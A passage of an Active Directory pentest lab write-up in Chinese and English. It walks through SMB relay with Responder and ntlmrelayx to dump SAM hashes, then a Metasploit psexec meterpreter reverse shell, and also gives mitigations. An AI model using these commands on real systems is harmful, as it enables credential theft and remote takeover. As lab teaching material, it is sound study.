+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**$(Get-ItemProperty -Path <span class="string">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient&quot;</span> -name EnableMulticast).EnableMulticast**</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/ADInitial_Untitled_9.png" alt="Untitled"></p>
+<p><strong>我們可以透過在 cmd.exe 中執行以下命令並收到「2」作為回報來確認我們已緩解 NBT-NS：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**wmic nicconfig get caption,index,TcpipNetbiosOptions**</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/ADInitial_Untitled_10.png" alt="Untitled"></p>
+<h2 id="SMB-Relay-Attacks-Overview"><a href="#SMB-Relay-Attacks-Overview" class="headerlink" title="SMB Relay Attacks Overview"></a><strong>SMB Relay Attacks Overview</strong></h2><p><a target="_blank" rel="noopener" href="https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/">https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/</a></p>
+<p>伺服器訊息塊(SMB) 用作網路檔案共享協定。它使電腦應用程式能夠讀取、寫入檔案以及請求網路中的伺服器程式服務。</p>
+<p>SMB 在 Windows 環境中廣泛採用，提供對文件和印表機等資源的共用存取。然而，當與NTLM (NT LAN Manager) 驗證配合使用且不安全時，它就會成為中繼攻擊的主要目標。從本質上講，攻擊者操縱了協定對網路使用者的固有信任。</p>
+<ul>
+<li>SMB 遭受relay attack的核心漏洞源自於其身分驗證機制，尤其是在使用 NTLM 時</li>
+<li>當使用者尋求存取共享資源時，SMB 會啟動連線並對使用者進行身份驗證</li>
+<li>攻擊者可以抓住此身份驗證嘗試，將其轉發到不同的伺服器以冒充用戶</li>
+<li>由於缺乏 SMB 對身份驗證請求的來源或目的地的驗證（透過 SMB 簽署），攻擊者可以利用它進行未經授權的存取。</li>
+<li>What is SMB Relay?<ul>
+<li>Instead of cracking hashes gathered with Responder,we can instead relay those<br>  hashes to specific machines and potentially gain access</li>
+<li>Requirements<ul>
+<li><strong>SMB signing</strong> must be disabled or not enforced on the target</li>
+<li>Relayed user credentials must be admin on machine for any real value</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>也許你正在捕獲hash，但實際上並沒有破解，也許密碼政策真的不錯，但可以通過SMB Relay訪問機器</li>
+<li><strong>由於這些憑證經過中繼，因此密碼強度變得無關緊要</strong></li>
+<li><strong>注意：預設情況下，所有 Windows 工作站（非伺服器）都停用或不強制執行 SMB 簽章。</strong></li>
+<li>它在伺服器上啟用或強制執行並不意味你不會遇到啟用了SMB signing的工作站</li>
+<li>或者將遇到或不會遇到禁用SMB簽名的工作站</li>
+<li>網域控制器目前不會啟用該功能，相關用戶憑據必須是電腦上的管理員(本地管理員)才能有利用價值</li>
+</ul>
+<p>攻擊順序：</p>
+<ul>
+<li>攻擊者識別易受攻擊的工作站的 IP。</li>
+<li>攻擊者啟動<strong>relay attack</strong>所需的工具。</li>
+<li>接下來，發生一個事件（例如 LLMNR <strong>Poisoning</strong> ），導致用戶雜湊在幕後被攔截。</li>
+<li>最後，攻擊者轉發截獲的憑證，獲得未經授權的存取。</li>
+</ul>
+<h3 id="Identify-Hosts-Without-SMB-Signing"><a href="#Identify-Hosts-Without-SMB-Signing" class="headerlink" title="Identify Hosts Without SMB Signing"></a>Identify Hosts Without SMB Signing</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#腳本會嘗試以訪客使用者身分連接到目標的偵聽 SMB2 服務。然後它將提供有關該服務的資訊</span></span><br><span class="line">**nmap --script smb2-security-mode.nse -p445 &lt;目標ip&gt;**</span><br><span class="line"></span><br><span class="line">訊息簽名可能產生三種結果：</span><br><span class="line"></span><br><span class="line">&gt; 訊息簽名已停用</span><br><span class="line">&gt; 訊息簽名已啟用但不是必需的（SMB2 的預設）</span><br><span class="line">&gt; 已啟用且需要訊息簽名</span><br></pre></td></tr></table></figure>
+
+<p>在 SMB 中繼攻擊期間，攻擊者會捕獲有效的身份驗證會話，然後中繼它，從而獲得存取權限。攻擊者可以轉發這些雜湊值以進行未經授權的訪問，而不是破解雜湊值。</p>
+<p><img src="/img/ADInitial_Untitled_11.png" alt="Untitled"></p>
+<p>上圖顯示了未強制執行 SMB 簽章的工作站。這是 所有 Windows 工作站的預設設定。</p>
+<p>我們將收集所有未強制執行 SMB 簽章的工作站，並將它們放入名為Targets.txt的檔案中</p>
+<h3 id="make-some-configuration-changes-to-responder"><a href="#make-some-configuration-changes-to-responder" class="headerlink" title="make some configuration changes to responder"></a>make some configuration changes to responder</h3><p>我們將利用 Responder 和 ntlmrelayx 進行攻擊。我們必須先正確配置 Responder 以停用 SMB 和 HTTP 回應，因為這些回應將會轉送到 ntlmrelayx（最終中繼）。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /etc/responder/Responder.conf</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>hash are not being captured, but ther’re actually being relayed</li>
+</ul>
+<p><img src="/img/ADInitial_Untitled_12.png" alt="Untitled"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**<span class="built_in">sudo</span> responder –I eth0 -dwP**</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/ADInitial_Untitled_13.png" alt="Untitled"></p>
+<p>最後，將啟動 ntlmrelayx 並等待事件發生</p>
+<ul>
+<li>set that up with target file that’s going to be the host that we identified with SMB signing disable or not enforced, then we’re going to have that run</li>
+<li>when responder capture a hash, it’s actually going to forward that over to this NTLM relay</li>
+<li>going to forward that hash over to the targets selected</li>
+<li>If we’re a local administrator on the machine with the hash we capture, we will get some win</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/Porchetta-Industries/CrackMapExec">https://github.com/Porchetta-Industries/CrackMapExec</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **crackmapexec smb 192.168.19.2/24 --gen-relay-list target.txt**</span><br><span class="line">SMB         192.168.19.1    445    MSI              [*] Windows 10.0 Build 19041 x64 (name:MSI) (domain:MSI) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.19.140  445    HYDRA-DC         [*] Windows 10.0 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.<span class="built_in">local</span>) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         192.168.19.149  445    THEPUNISHER      [*] Windows 10.0 Build 19041 x64 (name:THEPUNISHER) (domain:MARVEL.<span class="built_in">local</span>) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.19.150  445    SPIDERMAN        [*] Windows 10.0 Build 19041 x64 (name:SPIDERMAN) (domain:MARVEL.<span class="built_in">local</span>) (signing:False) (SMBv1:False)</span><br><span class="line">SMB         192.168.19.130  445    WIN-3FH6WOQ6P1W  [*] b<span class="string">&#x27;W\x00i\x00n\x00d\x00o\x00w\x00s\x00 \x00S\x00e\x00r\x00v\x00e\x00r\x00 \x002\x000\x000\x003\x00 \x003\x007\x009\x000\x00 \x00S\x00e\x00r\x00v\x00i\x00c\x00e\x00 \x00P\x00a\x00c\x00k\x00 \x002\x00&#x27;</span> (name:WIN-3FH6WOQ6P1W) (domain:WIN-3FH6WOQ6P1W.KCL2.LOCAL) (signing:False) (SMBv1:True)</span><br><span class="line">...</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# <span class="built_in">cat</span> target.txt                                              </span><br><span class="line">192.168.19.1</span><br><span class="line">192.168.19.149</span><br><span class="line">192.168.19.150</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用 CME 枚舉 SMB 伺服器以及是否需要 SMB 訊息簽名</strong>，以及連接並執行後期利用活動。</p>
+<p>使用 CME 來尋找 AD 網路 (192.168.19.2&#x2F;24) 上的所有 SMB 伺服器，並另外尋找那些不需要訊息簽署的伺服器。它將那些不存在的檔案儲存到檔案名稱target.txt  。</p>
+<p>啟動<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a>來中繼憑證</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ntlmrelayx.py -tf target.txt -smb2support**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to hosts <span class="keyword">in</span> targetfile</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>need to an event to occur, point this directly to ourselves and that relay is going to happen</p>
+<p>在受害機上開啟檔案總管並輸入\192.168.19.130連線到攻擊者</p>
+<p><img src="/img/ADInitial_Untitled_14.png" alt="Untitled"></p>
+<p>Attack succeeded or this authentication succeeded</p>
+<ul>
+<li>dumps out for us the hashs of SAM</li>
+</ul>
+<p>Once we have this hash for the administrator, we can use that to login to the machine</p>
+<p>An event (such as LLMNR poisoning) has occurred.  Responder will capture this event, pass it to ntlmrelayx, which will relay the credentials to the targets in our targets.txt file.</p>
+<p>再輸入\192.168.19.130會回傳credentials 回攻擊機</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] SMBD-Thread-3: Received connection from 192.168.19.149, attacking target smb://192.168.19.150</span><br><span class="line">[-] SMBCLient error: [Errno Connection error (192.168.19.150:445)] [Errno 113] No route to host</span><br><span class="line">[*] SMBD-Thread-3: Received connection from 192.168.19.149, attacking target smb://192.168.19.149</span><br><span class="line">[*] SMBD-Thread-4: Received connection from 192.168.19.149, attacking target smb://192.168.19.1</span><br><span class="line">[-] Authenticating against smb://192.168.19.1 as MARVEL\fcastle FAILED</span><br><span class="line">[*] SMBD-Thread-5: Received connection from 192.168.19.149, attacking target smb://192.168.19.150</span><br><span class="line">[*] Authenticating against smb://192.168.19.150 as MARVEL\fcastle SUCCEED</span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Service RemoteRegistry is disabled, enabling it</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0x270eea595503845c7b7af622ad54e71e</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">**Administrator:500:aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:388347163f7f36db1640f63ff0e9e374:::</span><br><span class="line">peterparker:1001:aad3b435b51404eeaad3b435b51404ee:9d45c944752dc08356c32926dbd53bb1:::**</span><br></pre></td></tr></table></figure>
+
+<p>正如您在此處所看到的，本機 SAM hash已被轉儲。這些哈希值現在可以離線並破解。更好的是，我們可以利用哈希傳遞攻擊來存取機器而無需破解密碼。</p>
+<p>注意：我們沒有也沒有必要破壞網域帳戶。同樣，中繼攻擊的優點在於您不需要知道密碼即可完成攻擊。</p>
+<p>SAM</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/259">https://forum.butian.net/share/259</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/secretsdump.py">https://github.com/fortra/impacket/blob/master/examples/secretsdump.py</a></p>
+<ul>
+<li>SAM(安全帳戶管理器)，SAM存放在註冊表中</li>
+<li><strong>SAM用來儲存Windows作業系統密碼的資料庫文件</strong></li>
+<li>為了避免明文密碼洩露，SAM文件中保存的是明文密碼經過一系列演算法處理過的Hash值，被保存的Hash分為LM Hash（已廢棄）和NTLMHash（長度32bit由字母數字組成）</li>
+<li>現在用戶憑證是以NTLM HASH形式保存</li>
+<li>當使用者在本地或遠端登陸系統時，會將Hash值與SAM檔案中儲存的Hash值進行比較</li>
+<li>在後期的Windows系統中，SAM檔案中被儲存的密碼Hash都被金鑰SYSKEY加密，接下來將對SAM進行利用</li>
+</ul>
+<p><strong>除了轉儲本地 SAM 雜湊值之外，還可以透過 SMB 中繼攻擊獲得其他樂趣。例如，我們可以獲得機器上的 shell 存取權限：</strong></p>
+<p>get an interactive shell as opposed to just getting that SAM dump</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx.py –tf targets.txt –smb2support -i</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/ADInitial_Untitled_15.png" alt="Untitled"></p>
+<ul>
+<li>thorugh the file system - machine、shares..<ul>
+<li>do a lot different things here via the shell that we have created</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 127.0.0.1 11000</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/ADInitial_Untitled_16.png" alt="Untitled"></p>
+<p><strong>可以遠端運行命令。在此範例中，我們將在中繼攻擊期間簡單地執行“whoami”。</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntlmrelayx –tf targets.txt –smb2support –c “<span class="built_in">whoami</span>”</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/ADInitial_Untitled_17.png" alt="Untitled"></p>
+<p>If you get that SAM dump you’re gonna be fine anyway</p>
+<h3 id="如何緩解-SMB-中繼攻擊？"><a href="#如何緩解-SMB-中繼攻擊？" class="headerlink" title="如何緩解 SMB 中繼攻擊？"></a><strong>如何緩解 SMB 中繼攻擊？</strong></h3><p>Mitigation Strategies:</p>
+<ul>
+<li>Enable SMB Signing on all devices<ul>
+<li>Pro:Completely stops the attack</li>
+<li>Con:Can cause performance issues with file copies</li>
+</ul>
+</li>
+<li>Disable NTLM authentication on network<ul>
+<li>Pro:Completely stops the attack</li>
+<li>Con:If Kerberos stops working,Windows defaults back to NTLM</li>
+</ul>
+</li>
+<li>Account tiering:<ul>
+<li>Pro:Limits domain admins to specific tasks (e.g.only log onto servers with need for DA)</li>
+<li>Con:Enforcing the policy may be difficult</li>
+</ul>
+</li>
+<li>Local admin restriction:<ul>
+<li>Pro:Can prevent a lot of lateral movement</li>
+<li>Con:Potential increase in the amount of service desk tickets</li>
+</ul>
+</li>
+</ul>
+<p>主要防禦 - 在所有裝置上啟用 SMB 簽名</p>
+<p>優點：這可以完全阻止攻擊。<br>缺點：這可能會導致使用 SMBv1 的檔案副本和舊裝置出現效能問題。</p>
+<p>若要強制執行 SMB 簽名，請在電腦Group Policy ..&gt;</p>
+<p>Computer Configuration &gt; Policies &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options:</p>
+<p>在客戶端：</p>
+<ul>
+<li>Microsoft 網路用戶端：對通訊進行數位簽署（始終）</li>
+<li>Microsoft 網路用戶端：對通訊進行數位簽署（如果伺服器同意）</li>
+</ul>
+<p>在伺服器端：</p>
+<ul>
+<li>Microsoft 網路伺服器：對通訊進行數位簽章（始終）</li>
+<li>Microsoft 網路伺服器：對通訊進行數位簽章（如果客戶同意）</li>
+</ul>
+<p><img src="/img/ADInitial_Untitled_18.png" alt="Untitled"></p>
+<p><strong>確認我們的緩解措施</strong></p>
+<p>我們可以透過在 cmd.exe 中執行以下命令並收到兩項返回的<strong>「0x1」</strong>來確認我們已緩解 SMB 中繼攻擊：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg query HKLM\System\CurrentControlSet\Services\LanManServer\Parameters | findstr /I securitysignature</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/ADInitial_Untitled_19.png" alt="Untitled"></p>
+<p>替代防禦</p>
+<p>如果公司無法在所有裝置上強制執行 SMB 簽名，最好的做法是：</p>
+<ul>
+<li>利用帳戶分層。例如，如果 Bob 是網域管理員，Bob 將有兩個帳戶：「bob」和「bob-da」。<ul>
+<li>這將限制網域管理員執行特定任務（例如，僅登入需要網域管理員的伺服器）。</li>
+</ul>
+</li>
+<li>本機管理員限制。限制本地管理員將使中繼攻擊變得更加困難。</li>
+</ul>
+<h2 id="Gaining-Shell-Access"><a href="#Gaining-Shell-Access" class="headerlink" title="Gaining Shell Access"></a><strong>Gaining Shell Access</strong></h2><p>capture some hashes、crack some password via a SAM dump in relay attack</p>
+<p>using a module called <code>psexec</code> </p>
+<p>psexec.py能夠獲得在目標為windows的主機的互動式shell，只需要獲取使用者名稱以及密碼</p>
+<p>do this with a password</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**msfconsole**</span><br><span class="line">...</span><br><span class="line">   4   auxiliary/scanner/smb/psexec_loggedin_users                   normal     No     Microsoft Windows Authenticated Logged In Users Enumeration</span><br><span class="line">   **5   exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution**</span><br><span class="line">   6   auxiliary/admin/smb/psexec_ntdsgrab                           normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility</span><br><span class="line">   7   exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token</span><br><span class="line">   8   encoder/x86/service                                           manual     No     Register Service</span><br><span class="line">   9   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec</span><br><span class="line">   10  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution</span><br><span class="line">   11  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 11, use 11 or use exploit/windows/local/wmi</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 5</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOSTS                                 <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com</span><br><span class="line">                                                    /docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT                 445              <span class="built_in">yes</span>       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to be used on target <span class="keyword">for</span> pretty</span><br><span class="line">                                                     listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SMBDomain             .                no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBSHARE                               no        The share to connect to, can be an admin share (ADM</span><br><span class="line">                                                    IN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBUser                                no        The username to authenticate as</span><br><span class="line"></span><br><span class="line">**Payload options (windows/meterpreter/reverse_tcp):**</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>
+
+<p><strong>Payload options &gt; the target machine is 64bit machine，</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp**</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **options**</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOSTS                                 <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com</span><br><span class="line">                                                    /docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT                 445              <span class="built_in">yes</span>       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to be used on target <span class="keyword">for</span> pretty</span><br><span class="line">                                                     listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SMBDomain             .                no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                                no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBSHARE                               no        The share to connect to, can be an admin share (ADM</span><br><span class="line">                                                    IN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBUser                                no        The username to authenticate as</span><br><span class="line"></span><br><span class="line">**Payload options (windows/x64/meterpreter/reverse_tcp):**</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"><span class="comment">#針對option中需要填寫的項目寫入目標機器資訊</span></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> rhost 192.168.19.149 <span class="comment">#目標是fcastle在THEPUNISHER那台機器</span></span><br><span class="line">rhost =&gt; 192.168.19.149</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> smbdomain MARVEL.<span class="built_in">local</span>** </span><br><span class="line">smbdomain =&gt; MARVEL.<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> smbuser fcastle**</span><br><span class="line">smbuser =&gt; fcastle</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> smbpass Password1**</span><br><span class="line">smbpass =&gt; Password1</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOSTS                192.168.19.149   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com</span><br><span class="line">                                                    /docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT                 445              <span class="built_in">yes</span>       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to be used on target <span class="keyword">for</span> pretty</span><br><span class="line">                                                     listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SMBDomain             MARVEL.<span class="built_in">local</span>     no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass               Password1        no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBSHARE                               no        The share to connect to, can be an admin share (ADM</span><br><span class="line">                                                    IN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBUser               fcastle          no        The username to authenticate as</span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           <span class="built_in">yes</span>       Exit technique (Accepted: <span class="string">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Id  Name</span><br><span class="line">    --  ----</span><br><span class="line">=&gt;  0   Automatic</span><br><span class="line">    1   PowerShell</span><br><span class="line">    2   Native upload</span><br><span class="line">    3   MOF upload</span><br><span class="line">    4   Command</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.149:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.19.149:445 - Authenticating to 192.168.19.149:445|MARVEL.<span class="built_in">local</span> as user <span class="string">&#x27;fcastle&#x27;</span>...</span><br><span class="line">[*] 192.168.19.149:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.19.149:445 - Executing the payload...</span><br><span class="line">[+] 192.168.19.149:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (201798 bytes) to 192.168.19.149</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.19.130:4444 -&gt; 192.168.19.149:60647) at 2024-02-19 10:44:11 -0500</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果遇到Service failed to start - ACCESS_DENIED的情況，記得先去關閉目標機器防毒及防火牆</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; **background** <span class="comment">#session available to us, if end up doing an host</span></span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt;</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **sessions** </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                        Connection</span><br><span class="line">  --  ----  ----                     -----------                        ----------</span><br><span class="line">  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ THEPUNISHER  192.168.19.130:4444 -&gt; 192.168.19.149:60647 (192.168.19.149)</span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **sessions 1**</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; **background**</span><br><span class="line">[*] Backgrounding session 1...</span><br></pre></td></tr></table></figure>
+
+<p>在進行後利用時，我們可能會遇到需要執行其他任務的情況，例如測試不同的利用，或執行權限升級利用。在這種情況下，我們需要將目前的 Meterpreter 會話置於背景。我們可以透過發出background命令來做到這一點</p>
+<p>接下來要進行NTLM attack </p>
+<ul>
+<li>設定成local user</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">set</span> smbuser administrator**</span><br><span class="line">smbuser =&gt; administrator</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; **<span class="built_in">unset</span> smbdomain**</span><br><span class="line">Unsetting smbdomain...</span><br><span class="line">[!] Variable <span class="string">&quot;smbdomain&quot;</span> <span class="built_in">unset</span> - but will use a default value still. If this is not desired, <span class="built_in">set</span> it to a new value or attempt to clear it with <span class="built_in">set</span> --clear smbdomain</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>將之前透過<strong>ntlmrelayx.py</strong>找到的憑證資訊</p>
+<p>複製管理員的hash &gt; aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03</p>
